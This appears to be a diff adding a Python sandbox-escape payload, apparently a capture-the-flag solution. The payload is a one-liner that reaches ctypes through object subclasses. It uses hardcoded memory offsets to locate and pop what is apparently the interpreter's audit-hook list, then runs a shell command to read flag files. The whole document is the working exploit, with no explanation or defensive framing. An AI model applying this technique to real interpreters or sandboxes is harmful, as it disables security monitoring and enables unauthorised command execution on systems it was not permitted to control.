@@ -1,0 +1,2 @@
+ctypes
+g = ().__class__.__base__.__subclasses__()[-2].__init__.__globals__; ref = g["byref"](g["py_object"](())); tp = g["POINTER"](g["c_uint64"]); ptr = g["cast"](ref, tp); ptr = g["cast"](ptr.contents.value - 0x129b8, tp); ptr = g["cast"](ptr.contents.value + 0x413c8, tp); hooks = g["cast"](ptr.contents.value, g["py_object"]).value; hooks.pop(); g["_os"].system("cat flag-*.txt")
